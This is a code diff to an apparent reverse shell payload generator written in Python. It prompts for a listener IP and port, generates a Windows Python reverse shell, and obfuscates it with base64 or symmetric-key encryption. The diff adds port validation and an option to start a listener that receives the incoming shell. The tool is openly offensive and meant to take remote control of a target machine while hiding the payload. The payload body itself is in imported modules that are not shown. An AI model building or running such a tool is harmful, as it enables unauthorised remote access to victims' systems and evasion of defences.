@@ -2,6 +2,7 @@ import re
 import subprocess
 import platform
 from payload_enc_dec import obfuscation
+from listener import listener
 import color
 from reverse_shell_payload.for_windows import python_rs
 
@@ -54,22 +55,35 @@ def main():
     while ip not in machine_ip_list:
         print(f'{color.bright_red(ip)} is not in {color.bright_red(machine_ip_list)}')
         ip = input(f'listener ip (suggested : {color.bright_blue(get_machine_ip())}: ')
-    port = input('listener port: ')
-    print(f'{color.white("1. base64")} \n{color.white("2. RandomKey")} {color.bright_blue("(recommended)")}')
+    port = None
+    while not port:
+        port = input('listener port: ')
+    port = int(port)
+    while port <= 0 or port >= 65535:
+        print('Invalid port number')
+        print('Port number should be between 0 and 65535')
+        port = input('listener port: ')
+        port = int(port)
+
+    print(f'{color.white("1. base64")} \n{color.white("2. Symmetric Key")} {color.bright_blue("(recommended)")}')
     selection = input(f'{color.bright_black("> ")}')
     payload_file_path = python_rs.py_rs(ip, port, destination)
     if selection == '1':
         encrypted_file_address = obfuscation.base64_esd(file_path=payload_file_path,
                                                         output_file_destination=payload_file_path)
     elif selection == '2':
-        encrypted_file_address = obfuscation.random_key(file_path=payload_file_path,
-                                                        output_file_destination=payload_file_path)
+        encrypted_file_address = obfuscation.symmetric_key(file_path=payload_file_path,
+                                                           output_file_destination=payload_file_path)
     else:
         print('Invalid Selection')
         return
     clear()
     print(f'Payload created at {color.bright_green(payload_file_path)}')
     print(f'Encrypted payload created at {color.bright_green(encrypted_file_address)}')
+    print(f'Listener ip: {color.bright_green(ip)}' + f' Listener port: {color.bright_green(port)}')
+    selection = input(color.bright_yellow("Do you want to start the listener? (y/n): "))
+    if selection.lower() == 'y':
+        listener.listen(ip, port)
 
 
 if __name__ == '__main__':
